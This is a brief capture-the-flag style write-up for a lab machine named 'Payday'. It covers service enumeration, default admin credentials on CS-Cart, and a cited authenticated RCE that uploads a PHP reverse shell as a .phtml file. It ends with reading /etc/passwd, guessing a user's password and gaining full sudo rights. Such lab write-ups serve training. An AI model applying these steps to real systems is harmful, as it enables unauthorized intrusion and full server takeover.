# Payday

### Enumeration

```
80/tcp  open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
|_http-title: CS-Cart. Powerful PHP shopping cart software
```

Default credentials - admin:admin

CS-Cart 1.3.3 - authenticated RCE

[https://www.exploit-db.com/exploits/48891](https://www.exploit-db.com/exploits/48891)

> get PHP shells from http://pentestmonkey.net/tools/web-shells/php-reverse-shell&#x20;
>
> edit IP && PORT&#x20;
>
> Upload to file manager change the extension from .php to .phtml&#x20;
>
> visit http://\[victim]/skins/shell.phtml --> Profit. ...!

### Initial Access

Visited and got reverse shell - https://192.168.117.39/skins/shell.phtml

### PrivEsc

```
$ cat /etc/passwd
...
patrick:x:1000:1000:patrick,,,:/home/patrick:/bin/bash
```

Brute force with rockyou or try simple thinking :)

patrick:patrick

```
sudo -l
(ALL) ALL
```
